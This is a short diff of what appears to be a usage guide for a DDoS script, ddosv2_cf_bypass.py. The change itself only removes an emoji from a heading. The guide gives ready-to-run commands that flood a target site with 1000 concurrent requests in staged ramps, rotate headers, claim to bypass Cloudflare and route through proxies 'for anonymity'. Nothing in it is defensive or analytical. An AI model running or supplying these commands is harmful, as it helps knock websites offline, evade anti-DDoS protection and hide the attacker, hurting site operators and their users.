@@ -8,7 +8,7 @@ v3
 Single Command - One Liner (Simplest Fast)
 python3 ddosv2_cf_bypass.py --url https://target-site.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
 
-📦 With Proxy Support (For Anonymity + Speed)
+With Proxy Support (For Anonymity + Speed)
 python3 ddosv2_cf_bypass.py \
   --url https://target-site.com \
   --bypass-cloudflare \
